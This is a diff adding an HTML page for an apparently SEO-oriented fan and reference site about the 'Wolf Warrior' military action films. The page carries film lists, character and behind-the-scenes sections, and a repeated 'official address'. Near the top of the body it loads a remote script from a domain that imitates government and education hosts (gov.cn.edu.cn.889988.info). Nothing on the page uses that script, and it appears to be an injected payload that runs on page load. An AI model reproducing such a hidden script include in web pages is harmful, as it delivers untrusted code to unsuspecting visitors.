@@ -1,0 +1,592 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>战狼电影网｜华语军事动作电影资料与观影索引 - 战狼电影网</title>
+<meta name="description" content="战狼电影网（zhanlangdianyingwang-zh）是聚焦《战狼》系列及国产军事动作电影的专题站点，整理影片资料、幕后创作、角色档案与观影指南。访问官方地址：https://zhanlangdianyingwang-zh.github.io，获取结构化的电影信息与内容索引。">
+<meta name="keywords" content="战狼电影网, 战狼, 战狼系列电影, 国产军事动作片, 吴京, 电影资料库, zhanlangdianyingwang-zh, https://zhanlangdianyingwang-zh.github.io">
+<meta name="author" content="战狼电影网">
+<meta name="robots" content="index, follow">
+<meta name="copyright" content="战狼电影网">
+<link rel="canonical" href="https://zhanlangdianyingwang-zh.github.io/">
+<!-- Open Graph -->
+<meta property="og:type" content="website">
+<meta property="og:title" content="战狼电影网 - 华语军事动作电影资料与观影索引">
+<meta property="og:description" content="专注《战狼》系列与国产军事动作片的专题站点，提供影片资料、幕后创作与观影指南。">
+<meta property="og:url" content="https://zhanlangdianyingwang-zh.github.io/">
+<meta property="og:site_name" content="战狼电影网">
+<!-- 结构化数据：站点信息 -->
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "WebSite",
+  "name": "战狼电影网",
+  "url": "https://zhanlangdianyingwang-zh.github.io/",
+  "description": "聚焦《战狼》系列及国产军事动作电影的专题资料站点",
+  "potentialAction": {
+    "@type": "SearchAction",
+    "target": "https://zhanlangdianyingwang-zh.github.io/#search",
+    "query-input": "required name=query"
+  }
+}
+</script>
+<style>
+  :root{
+    --bg:#f4f5f7;
+    --ink:#1c1f24;
+    --muted:#5b6470;
+    --line:#e3e6ea;
+    --brand:#0e2b45;
+    --accent:#c8a24a;
+    --white:#ffffff;
+    --radius:14px;
+  }
+  *{box-sizing:border-box;margin:0;padding:0;}
+  html{scroll-behavior:smooth;}
+  body{
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif;
+    background:var(--bg);color:var(--ink);line-height:1.7;
+    -webkit-font-smoothing:antialiased;
+  }
+  a{color:inherit;text-decoration:none;}
+  ul{list-style:none;}
+  img{max-width:100%;display:block;}
+
+  /* 顶部 */
+  .topbar{
+    background:var(--brand);color:var(--white);
+    padding:10px 16px;font-size:12px;
+    border-bottom:3px solid var(--accent);
+  }
+  .topbar-inner{max-width:1120px;margin:0 auto;display:flex;flex-wrap:wrap;gap:10px;align-items:center;justify-content:space-between;}
+  .url-tag{font-family:"SFMono-Regular",Consolas,monospace;letter-spacing:.3px;color:#e8d9a8;}
+  .url-tag b{color:var(--accent);}
+
+  /* 导航 */
+  header.site{
+    background:var(--white);border-bottom:1px solid var(--line);
+    position:sticky;top:0;z-index:50;box-shadow:0 2px 10px rgba(0,0,0,.04);
+  }
+  .nav{max-width:1120px;margin:0 auto;padding:14px 16px;display:flex;align-items:center;gap:16px;}
+  .brand-mark{display:flex;align-items:center;gap:10px;flex-shrink:0;}
+  .brand-logo{
+    width:38px;height:38px;border-radius:10px;background:var(--brand);color:var(--accent);
+    display:grid;place-items:center;font-weight:800;font-size:15px;
+  }
+  .brand-text h1{font-size:17px;letter-spacing:.5px;line-height:1.2;}
+  .brand-text small{color:var(--muted);font-size:11px;letter-spacing:1px;text-transform:uppercase;}
+  .menu-btn{
+    margin-left:auto;display:none;background:none;border:1px solid var(--line);
+    border-radius:8px;padding:6px 10px;cursor:pointer;font-size:13px;color:var(--brand);
+  }
+  nav.links{margin-left:auto;}
+  nav.links ul{display:flex;gap:4px;flex-wrap:wrap;}
+  nav.links a{
+    display:block;padding:8px 13px;border-radius:8px;font-size:14px;color:var(--muted);
+    transition:.2s;
+  }
+  nav.links a:hover{background:var(--bg);color:var(--brand);}
+
+  /* 布局 */
+  .wrap{max-width:1120px;margin:0 auto;padding:0 16px;}
+  section{padding:48px 0;}
+  .eyebrow{
+    color:var(--accent);font-size:12px;font-weight:700;letter-spacing:2px;
+    text-transform:uppercase;margin-bottom:8px;
+  }
+  h2{font-size:26px;line-height:1.3;margin-bottom:12px;color:var(--brand);}
+  .lead{color:var(--muted);max-width:680px;margin-bottom:28px;}
+
+  /* Hero */
+  .hero{
+    background:linear-gradient(135deg,#0e2b45 0%,#164263 55%,#1c5478 100%);
+    color:var(--white);padding:64px 0 72px;position:relative;overflow:hidden;
+  }
+  .hero::after{
+    content:"";position:absolute;right:-90px;bottom:-120px;width:320px;height:320px;
+    border:26px solid rgba(200,162,74,.18);border-radius:50%;
+  }
+  .hero-grid{display:grid;grid-template-columns:1.1fr .9fr;gap:40px;align-items:center;}
+  .hero h2{color:var(--white);font-size:34px;margin-bottom:16px;}
+  .hero h2 em{color:var(--accent);font-style:normal;}
+  .hero p{color:#d5e0ea;font-size:15px;margin-bottom:22px;}
+  .hero-stats{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-top:26px;}
+  .stat{background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.14);border-radius:12px;padding:16px;}
+  .stat strong{display:block;font-size:24px;color:var(--accent);}
+  .stat span{font-size:12px;color:#c5d3df;}
+  .hero-card{
+    background:var(--white);color:var(--ink);border-radius:var(--radius);
+    padding:26px;box-shadow:0 18px 40px rgba(0,0,0,.18);position:relative;z-index:2;
+  }
+  .hero-card .badge{
+    display:inline-block;background:#fdf3e0;color:#9a6f12;font-size:11px;
+    padding:4px 10px;border-radius:20px;margin-bottom:12px;font-weight:600;
+  }
+  .hero-card h3{font-size:19px;margin-bottom:6px;}
+  .hero-card .url-line{
+    font-family:monospace;font-size:13px;color:var(--brand);
+    background:var(--bg);padding:10px 12px;border-radius:8px;margin:14px 0;
+    border:1px dashed var(--line);word-break:break-all;
+  }
+  .btn{
+    display:inline-block;background:var(--accent);color:#2a2110;font-weight:700;
+    padding:11px 22px;border-radius:9px;font-size:14px;transition:.2s;
+  }
+  .btn:hover{background:#b88f38;}
+  .btn-ghost{
+    display:inline-block;border:1px solid rgba(255,255,255,.4);color:var(--white);
+    padding:10px 20px;border-radius:9px;font-size:14px;margin-left:10px;
+  }
+
+  /* 通用网格 */
+  .grid{display:grid;gap:18px;}
+  .g3{grid-template-columns:repeat(3,1fr);}
+  .g4{grid-template-columns:repeat(4,1fr);}
+  .g2{grid-template-columns:repeat(2,1fr);}
+  .card{
+    background:var(--white);border:1px solid var(--line);border-radius:var(--radius);
+    padding:22px;transition:.25s;
+  }
+  .card:hover{transform:translateY(-4px);box-shadow:0 10px 24px rgba(0,0,0,.07);border-color:#cfd6de;}
+  .card .num{
+    display:inline-grid;place-items:center;width:34px;height:34px;border-radius:9px;
+    background:var(--brand);color:var(--accent);font-weight:800;font-size:14px;margin-bottom:12px;
+  }
+  .card h3{font-size:16px;margin-bottom:8px;color:var(--brand);}
+  .card p{font-size:13.5px;color:var(--muted);}
+  .card .tag{display:inline-block;font-size:11px;color:var(--accent);border:1px solid #e4d3a6;padding:2px 8px;border-radius:20px;margin-top:12px;}
+
+  /* 栏目区块 */
+  .section-head{display:flex;align-items:end;justify-content:space-between;gap:16px;margin-bottom:26px;}
+  .section-head .more{font-size:13px;color:var(--accent);font-weight:600;flex-shrink:0;}
+
+  .film-list li{
+    display:flex;gap:14px;align-items:flex-start;padding:14px 0;border-bottom:1px dashed var(--line);
+  }
+  .film-list li:last-child{border-bottom:none;}
+  .film-list .yr{
+    flex-shrink:0;width:56px;height:56px;border-radius:10px;background:var(--bg);
+    display:grid;place-items:center;font-weight:800;color:var(--brand);font-size:14px;
+  }
+  .film-list h4{font-size:15px;margin-bottom:3px;}
+  .film-list p{font-size:13px;color:var(--muted);}
+
+  .poster-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:16px;}
+  .poster{background:var(--white);border-radius:var(--radius);overflow:hidden;border:1px solid var(--line);}
+  .poster .frame{
+    aspect-ratio:3/4;background:linear-gradient(160deg,#0e2b45,#2a5d80);
+    display:grid;place-items:center;color:var(--accent);font-weight:800;font-size:15px;text-align:center;padding:12px;
+  }
+  .poster .meta{padding:12px;}
+  .poster .meta h4{font-size:14px;margin-bottom:3px;}
+  .poster .meta span{font-size:12px;color:var(--muted);}
+
+  .timeline{position:relative;padding-left:26px;}
+  .timeline::before{content:"";position:absolute;left:7px;top:6px;bottom:6px;width:2px;background:var(--line);}
+  .timeline li{position:relative;padding-bottom:20px;}
+  .timeline li::before{
+    content:"";position:absolute;left:-24px;top:6px;width:14px;height:14px;border-radius:50%;
+    background:var(--accent);border:3px solid var(--white);box-shadow:0 0 0 2px #e4d3a6;
+  }
+  .timeline h4{font-size:15px;color:var(--brand);}
+  .timeline span{font-size:12px;color:var(--accent);font-weight:600;}
+  .timeline p{font-size:13px;color:var(--muted);margin-top:3px;}
+
+  .kw-cloud{display:flex;flex-wrap:wrap;gap:8px;}
+  .kw-cloud a{
+    font-size:13px;padding:6px 14px;border-radius:20px;background:var(--white);
+    border:1px solid var(--line);color:var(--muted);transition:.2s;
+  }
+  .kw-cloud a:hover{background:var(--brand);color:var(--white);border-color:var(--brand);}
+  .kw-cloud a.hot{background:var(--accent);color:#2a2110;border-color:var(--accent);font-weight:600;}
+
+  /* 数据条 */
+  .bar-row{margin-bottom:16px;}
+  .bar-row .top{display:flex;justify-content:space-between;font-size:13px;margin-bottom:5px;}
+  .bar-track{height:8px;background:var(--line);border-radius:6px;overflow:hidden;}
+  .bar-fill{height:100%;background:linear-gradient(90deg,var(--brand),var(--accent));border-radius:6px;}
+
+  /* 收录说明 */
+  .index-box{
+    background:var(--white);border-left:4px solid var(--accent);
+    border-radius:0 var(--radius) var(--radius) 0;padding:24px;
+  }
+  .index-box ul{padding-left:18px;}
+  .index-box li{list-style:disc;font-size:14px;color:var(--muted);margin-bottom:8px;}
+  .url-box{
+    background:var(--brand);color:var(--white);border-radius:var(--radius);
+    padding:26px;text-align:center;margin-top:22px;
+  }
+  .url-box code{display:block;font-family:monospace;font-size:18px;color:var(--accent);margin:10px 0 16px;word-break:break-all;}
+
+  /* 底部 */
+  footer{background:var(--brand);color:#a9b8c5;padding:40px 0 24px;}
+  footer .foot-grid{display:grid;grid-template-columns:1.4fr 1fr 1fr 1fr;gap:24px;}
+  footer h4{color:var(--white);font-size:14px;margin-bottom:12px;}
+  footer ul li{padding:5px 0;font-size:13px;}
+  footer ul a:hover{color:var(--accent);}
+  .foot-bot{
+    margin-top:28px;padding-top:18px;border-top:1px solid rgba(255,255,255,.1);
+    display:flex;flex-wrap:wrap;gap:12px;justify-content:space-between;font-size:12px;
+  }
+  .foot-bot .site-url{font-family:monospace;color:var(--accent);}
+
+  /* 响应式 */
+  @media (max-width:900px){
+    .g4,.g3{grid-template-columns:repeat(2,1fr);}
+    .hero-grid{grid-template-columns:1fr;}
+    footer .foot-grid{grid-template-columns:1fr 1fr;}
+  }
+  @media (max-width:640px){
+    section{padding:34px 0;}
+    .hero{padding:44px 0 54px;}
+    .hero h2{font-size:26px;}
+    .hero-stats{grid-template-columns:1fr 1fr;}
+    .menu-btn{display:inline-block;}
+    nav.links{
+      display:none;position:absolute;top:100%;left:0;right:0;background:var(--white);
+      border-bottom:1px solid var(--line);padding:10px 16px;box-shadow:0 8px 20px rgba(0,0,0,.06);
+    }
+    nav.links.open{display:block;}
+    nav.links ul{flex-direction:column;gap:0;}
+    nav.links a{padding:12px 8px;border-bottom:1px solid var(--bg);border-radius:0;}
+    h2{font-size:22px;}
+    .g4,.g3,.g2{grid-template-columns:1fr;}
+    footer .foot-grid{grid-template-columns:1fr;}
+    .btn-ghost{display:none;}
+  }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<!-- 顶部网址条 -->
+<div class="topbar">
+  <div class="topbar-inner">
+    <span>官方站点：<span class="url-tag"><b>https://</b>zhanlangdianyingwang-zh.github.io<b>/</b></span></span>
+    <span>华语军事动作电影 · 专题资料索引</span>
+  </div>
+</div>
+
+<!-- 导航 -->
+<header class="site">
+  <div class="nav">
+    <div class="brand-mark">
+      <div class="brand-logo">战</div>
+      <div class="brand-text">
+        <h1>战狼电影网</h1>
+        <small>zhanlangdianyingwang-zh</small>
+      </div>
+    </div>
+    <button class="menu-btn" onclick="document.getElementById('navlinks').classList.toggle('open')">菜单 ☰</button>
+    <nav class="links" id="navlinks">
+      <ul>
+        <li><a href="#home">首页</a></li>
+        <li><a href="#films">影片库</a></li>
+        <li><a href="#archive">资料档案</a></li>
+        <li><a href="#making">幕后制作</a></li>
+        <li><a href="#guide">观影指南</a></li>
+        <li><a href="#about">关于本站</a></li>
+      </ul>
+    </nav>
+  </div>
+</header>
+
+<!-- Hero -->
+<section class="hero" id="home">
+  <div class="wrap hero-grid">
+    <div>
+      <span class="eyebrow" style="color:var(--accent)">Chinese Military Action Film Archive</span>
+      <h2>聚焦《战狼》系列<br>梳理<em>国产军事动作电影</em>的完整脉络</h2>
+      <p>战狼电影网（zhanlangdianyingwang-zh）以影片为线索，系统整理剧情档案、人物关系、幕后创作与观影线索，为军事动作片爱好者提供结构化的内容索引。</p>
+      <a class="btn" href="#films">浏览影片库</a>
+      <a class="btn-ghost" href="#guide">查看观影指南</a>
+      <div class="hero-stats">
+        <div class="stat"><strong>4+</strong><span>核心栏目</span></div>
+        <div class="stat"><strong>10+</strong><span>专题资料</span></div>
+        <div class="stat"><strong>1</strong><span>官方站点地址</span></div>
+      </div>
+    </div>
+    <div class="hero-card">
+      <span class="badge">★ 官方站点</span>
+      <h3>战狼电影网</h3>
+      <p style="font-size:13px;color:var(--muted)">本站唯一官方访问地址</p>
+      <div class="url-line">https://zhanlangdianyingwang-zh.github.io</div>
+      <p style="font-size:13px;color:var(--muted);margin-bottom:16px">收录《战狼》系列影片资料、幕后创作记录与观影索引，内容持续整理更新。</p>
+      <a class="btn" href="#about">了解本站定位</a>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目一：影片库 -->
+<section id="films">
+  <div class="wrap">
+    <div class="section-head">
+      <div>
+        <span class="eyebrow">Film Library</span>
+        <h2>影片库</h2>
+      </div>
+      <a class="more" href="#">查看全部 #</a>
+    </div>
+    <p class="lead">以《战狼》系列为核心，按上映时间梳理影片档案，覆盖剧情梗概、人物设定与关键看点，方便快速定位目标内容。</p>
+    <ul class="film-list">
+      <li>
+        <div class="yr">2015</div>
+        <div>
+          <h4>《战狼》</h4>
+          <p>系列开篇之作，确立冷锋这一核心人物形象，展现特种兵在边境冲突中的行动轨迹。</p>
+        </div>
+      </li>
+      <li>
+        <div class="yr">2017</div>
+        <div>
+          <h4>《战狼2》</h4>
+          <p>场景规模与动作设计全面升级，以海外撤侨为背景，将个人英雄叙事与家国情怀结合。</p>
+        </div>
+      </li>
+      <li>
+        <div class="yr">待定</div>
+        <div>
+          <h4>《战狼3》</h4>
+          <p>系列后续作品动态与相关信息持续追踪整理，欢迎关注本站更新。</p>
+        </div>
+      </li>
+      <li>
+        <div class="yr">延伸</div>
+        <div>
+          <h4>同类军事动作片索引</h4>
+          <p>围绕国产军事题材，整理风格相近的影片与导演作品，形成横向参考线索。</p>
+        </div>
+      </li>
+    </ul>
+  </div>
+</section>
+
+<!-- 栏目二：资料档案 -->
+<section id="archive" style="background:var(--white);border-top:1px solid var(--line);border-bottom:1px solid var(--line);">
+  <div class="wrap">
+    <div class="section-head">
+      <div>
+        <span class="eyebrow">Data Archive</span>
+        <h2>资料档案</h2>
+      </div>
+      <a class="more" href="#">归档总览 #</a>
+    </div>
+    <div class="grid g4">
+      <div class="card">
+        <span class="num">1</span>
+        <h3>角色档案</h3>
+        <p>梳理主要角色的成长背景、性格特征与人物关系，帮助理解剧情走向与角色动机。</p>
+        <span class="tag">人物志</span>
+      </div>
+      <div class="card">
+        <span class="num">2</span>
+        <h3>剧情解析</h3>
+        <p>逐段拆解关键情节，分析叙事结构与戏剧冲突的设计逻辑。</p>
+        <span class="tag">剧作分析</span>
+      </div>
+      <div class="card">
+        <span class="num">3</span>
+        <h3>武器装备</h3>
+        <p>整理影片中出现的枪械、载具与战术装备，标注型号特征与使用场景。</p>
+        <span class="tag">军事考据</span>
+      </div>
+      <div class="card">
+        <span class="num">4</span>
+        <h3>台词金句</h3>
+        <p>汇集经典对白与主题台词，分析其传递的价值观与情感表达。</p>
+        <span class="tag">文本摘录</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目三：幕后制作 -->
+<section id="making">
+  <div class="wrap">
+    <div class="section-head">
+      <div>
+        <span class="eyebrow">Behind The Scenes</span>
+        <h2>幕后制作</h2>
+      </div>
+      <a class="more" href="#">更多花絮 #</a>
+    </div>
+    <div class="grid g2">
+      <div>
+        <ul class="timeline">
+          <li>
+            <span>筹备阶段</span>
+            <h4>剧本与世界观构建</h4>
+            <p>从人物原型到故事框架，逐步搭建系列世界观，平衡写实风格与商业类型片节奏。</p>
+          </li>
+          <li>
+            <span>拍摄阶段</span>
+            <h4>实拍与动作设计</h4>
+            <p>采用实景拍摄与实弹效果，动作团队围绕实战感设计打斗与枪战段落。</p>
+          </li>
+          <li>
+            <span>后期阶段</span>
+            <h4>剪辑与视听调校</h4>
+            <p>通过剪辑节奏与配乐强化情绪张力，塑造具有辨识度的视听风格。</p>
+          </li>
+          <li>
+            <span>宣发阶段</span>
+            <h4>上映与口碑传播</h4>
+            <p>从点映到公映的传播路径回顾，分析口碑发酵的关键节点。</p>
+          </li>
+        </ul>
+      </div>
+      <div>
+        <div class="poster-grid">
+          <div class="poster"><div class="frame">战狼<br>I</div><div class="meta"><h4>《战狼》</h4><span>2015 · 开篇</span></div></div>
+          <div class="poster"><div class="frame">战狼<br>II</div><div class="meta"><h4>《战狼2》</h4><span>2017 · 升级</span></div></div>
+          <div class="poster"><div class="frame">系列<br>III</div><div class="meta"><h4>后续追踪</h4><span>动态整理</span></div></div>
+          <div class="poster"><div class="frame">同类<br>索引</div><div class="meta"><h4>题材延伸</h4><span>横向参考</span></div></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目四：观影指南 -->
+<section id="guide" style="background:var(--white);border-top:1px solid var(--line);border-bottom:1px solid var(--line);">
+  <div class="wrap">
+    <div class="section-head">
+      <div>
+        <span class="eyebrow">Viewing Guide</span>
+        <h2>观影指南</h2>
+      </div>
+      <a class="more" href="#">完整指南 #</a>
+    </div>
+    <div class="grid g2">
+      <div>
+        <h3 style="font-size:18px;color:var(--brand);margin-bottom:16px;">推荐观看顺序</h3>
+        <div class="bar-row">
+          <div class="top"><span>按上映顺序观看</span><b>推荐度 95%</b></div>
+          <div class="bar-track"><div class="bar-fill" style="width:95%"></div></div>
+        </div>
+        <div class="bar-row">
+          <div class="top"><span>按剧情时间线观看</span><b>推荐度 78%</b></div>
+          <div class="bar-track"><div class="bar-fill" style="width:78%"></div></div>
+        </div>
+        <div class="bar-row">
+          <div class="top"><span>主题剪辑精编</span><b>推荐度 62%</b></div>
+          <div class="bar-track"><div class="bar-fill" style="width:62%"></div></div>
+        </div>
+        <h3 style="font-size:18px;color:var(--brand);margin:24px 0 12px;">关注焦点</h3>
+        <div class="kw-cloud">
+          <a href="#" class="hot">战狼电影网</a>
+          <a href="#">冷锋角色</a>
+          <a href="#">军事动作</a>
+          <a href="#" class="hot">zhanlangdianyingwang-zh.github.io</a>
+          <a href="#">撤侨叙事</a>
+          <a href="#">实拍特效</a>
+          <a href="#">家国情怀</a>
+          <a href="#">战术细节</a>
+          <a href="#">国产大片</a>
+          <a href="#">系列续作</a>
+        </div>
+      </div>
+      <div class="index-box">
+        <h3 style="font-size:18px;color:var(--brand);margin-bottom:12px;">内容索引建议</h3>
+        <ul>
+          <li>按「系列 → 单部 → 角色 → 幕后」四级结构浏览，先建立整体认知。</li>
+          <li>剧情解析与军事考据可交叉阅读，兼顾故事性与细节真实性。</li>
+          <li>同类影片索引用于横向比较，理解国产军事动作片的类型演进。</li>
+          <li>本站为专题资料站，内容持续整理，欢迎按栏目顺序系统查阅。</li>
+        </ul>
+        <div class="url-box">
+          <span>战狼电影网 · 唯一官方站点</span>
+          <code>https://zhanlangdianyingwang-zh.github.io</code>
+          <a class="btn" href="#">访问官网 #</a>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目五：关于本站 -->
+<section id="about">
+  <div class="wrap">
+    <div class="section-head">
+      <div>
+        <span class="eyebrow">About Us</span>
+        <h2>关于本站</h2>
+      </div>
+    </div>
+    <div class="grid g2">
+      <div class="card" style="padding:28px;">
+        <h3 style="font-size:19px;margin-bottom:12px;">站点定位</h3>
+        <p style="margin-bottom:14px">战狼电影网（zhanlangdianyingwang-zh）是专注于《战狼》系列及国产军事动作电影的专题资料站点，致力于以清晰的结构整理影片资料、幕后信息与观影线索，服务于电影爱好者与内容研究者。</p>
+        <p>本站官方地址为 <strong>https://zhanlangdianyingwang-zh.github.io</strong>，请认准该域名访问，避免误入仿冒站点。</p>
+      </div>
+      <div class="card" style="padding:28px;">
+        <h3 style="font-size:19px;margin-bottom:16px;">栏目构成</h3>
+        <ul class="film-list">
+          <li><div class="yr">01</div><div><h4>影片库</h4><p>系列作品与同类影片索引。</p></div></li>
+          <li><div class="yr">02</div><div><h4>资料档案</h4><p>角色、剧情、装备、台词整理。</p></div></li>
+          <li><div class="yr">03</div><div><h4>幕后制作</h4><p>从筹备到宣发的全流程记录。</p></div></li>
+          <li><div class="yr">04</div><div><h4>观影指南</h4><p>观看顺序与内容索引建议。</p></div></li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 底部 -->
+<footer>
+  <div class="wrap">
+    <div class="foot-grid">
+      <div>
+        <div class="brand-mark" style="margin-bottom:12px;">
+          <div class="brand-logo">战</div>
+          <div class="brand-text">
+            <h1 style="color:var(--white)">战狼电影网</h1>
+            <small>zhanlangdianyingwang-zh</small>
+          </div>
+        </div>
+        <p style="font-size:13px">聚焦《战狼》系列与国产军事动作电影的专题资料站点，提供结构化的影片档案与内容索引。</p>
+      </div>
+      <div>
+        <h4>栏目导航</h4>
+        <ul>
+          <li><a href="#films">影片库</a></li>
+          <li><a href="#archive">资料档案</a></li>
+          <li><a href="#making">幕后制作</a></li>
+          <li><a href="#guide">观影指南</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>内容索引</h4>
+        <ul>
+          <li><a href="#">角色档案 #</a></li>
+          <li><a href="#">剧情解析 #</a></li>
+          <li><a href="#">武器装备 #</a></li>
+          <li><a href="#">台词金句 #</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>官方站点</h4>
+        <p style="font-size:13px;margin-bottom:8px">唯一访问地址</p>
+        <span class="site-url">https://zhanlangdianyingwang-zh.github.io</span>
+      </div>
+    </div>
+    <div class="foot-bot">
+      <span>© <span id="year"></span> 战狼电影网 zhanlangdianyingwang-zh 保留所有权利</span>
+      <span>官方地址：https://zhanlangdianyingwang-zh.github.io</span>
+    </div>
+  </div>
+</footer>
+
+<script>
+  document.getElementById('year').textContent = new Date().getFullYear();
+  // 移动端菜单点击后自动收起
+  document.querySelectorAll('#navlinks a').forEach(function(a){
+    a.addEventListener('click',function(){document.getElementById('navlinks').classList.remove('open');});
+  });
+</script>
+</body>
+</html>
